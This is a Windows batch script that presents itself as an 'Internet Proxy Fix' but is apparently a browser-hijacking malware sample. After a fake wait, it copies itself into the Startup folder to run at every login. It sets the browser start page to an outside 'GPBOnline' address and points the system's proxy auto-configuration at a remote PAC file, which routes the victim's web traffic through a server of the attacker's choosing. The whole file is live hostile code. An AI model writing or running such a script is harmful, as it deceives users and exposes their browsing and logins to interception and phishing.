@echo off
echo Wscript.Sleep(6000) >> %temp%\sleep.vbs
echo Internet Proxy Fix
echo Please waiting ten seconds
%temp%\sleep.vbs
copy %0 "C:\Documents and Settings\All Users\Start Menu\Programs\Startup"
REG ADD "HKCU\Software\Microsoft\Internet Explorer\Main" /v "Start Page" /t REG_SZ /d "http://domain.com/GPBOnline" /f
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v "AutoConfigURL" /t REG_SZ /d "http://domain.com:8001/proxy.pac" /f
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v "ProxyEnable" /t REG_DWORD /d 00000000 /f


